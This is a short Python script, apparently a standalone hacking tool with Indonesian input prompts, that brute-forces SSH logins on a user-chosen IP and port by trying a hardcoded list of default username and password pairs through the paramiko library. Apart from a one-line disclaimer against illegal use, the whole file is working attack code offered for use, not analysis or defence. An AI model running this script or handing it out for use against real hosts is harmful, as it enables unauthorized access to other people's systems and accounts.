#!/usr/bin/env python3
# WARNING: DON'T USE FOR ILLEGAL PURPOSES

import paramiko

# Common SSH credentials for brute force testing
COMMON_CREDENTIALS = [
    ("root", "toor"),
    ("admin", "admin"),
    ("user", "password"),
    ("test", "123456"),
    ("admin", "admin1234")
]

# SSH brute force attack function
def ssh_brute_force(target, port=22, credentials=COMMON_CREDENTIALS):
    """Attempts to brute force SSH login on the target using common credentials."""
    print(f"Starting SSH brute force attack on {target}:{port}...")
    valid_credentials = []
    for username, password in credentials:
        try:
            print(f"Trying username: {username}, password: {password}")
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(target, port=port, username=username, password=password, timeout=5)
            print(f"SUCCESS: Username '{username}' and password '{password}' worked!")
            valid_credentials.append((username, password))
            client.close()
            return username, password
        except paramiko.AuthenticationException:
            print("Failed: Invalid credentials.")
        except paramiko.SSHException as e:
            print(f"SSH Error: {e}")
            break
        except Exception as e:
            print(f"Connection Error: {e}")
    print("Brute force attack failed. No valid credentials found.")
    return valid_credentials if valid_credentials else None

if __name__ == "__main__":
    target = input("Masukan IP address target: ").strip()
    port = int(input("Masukan port target: "))
    ssh_brute_force(target, port)